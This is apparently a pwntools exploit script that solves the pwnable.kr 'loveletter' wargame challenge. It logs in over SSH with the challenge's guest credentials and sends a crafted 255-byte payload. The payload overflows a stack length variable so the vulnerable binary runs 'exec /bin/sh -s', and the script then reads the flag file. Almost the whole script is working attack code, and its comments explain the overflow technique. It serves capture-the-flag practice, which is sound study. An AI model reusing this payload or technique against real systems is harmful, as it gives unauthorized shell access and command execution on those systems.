#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 9034 ./loveletter
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./loveletter')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or "loveletter"
password = args.PASSWORD or "guest"
remote_path = "loveletter"

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    """Execute the target binary on the remote host"""
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.connect_remote("127.0.0.1", 9034)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

# this will execute `exec /bin/sh -s ♥AAAAAAAAA...`
# the exploit works by overflowing the string into the prolog length by providing a 255 byte buffer,
# which together with the replacement of ; with ♥ (3 bytes) will overflow into the next stack variable,
# which happens to be the prolog length. this lets us copy only a single letter from the prolog, thus letting us 
# execute arbitrary command which start with e
payload = b"xec /bin/sh -s "
payload += b";"
payload = payload.ljust(254, b"A")
payload += p8(1)  # prolog_length

io.sendline(payload)

io.sendline(b"cat flag")
log.success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")

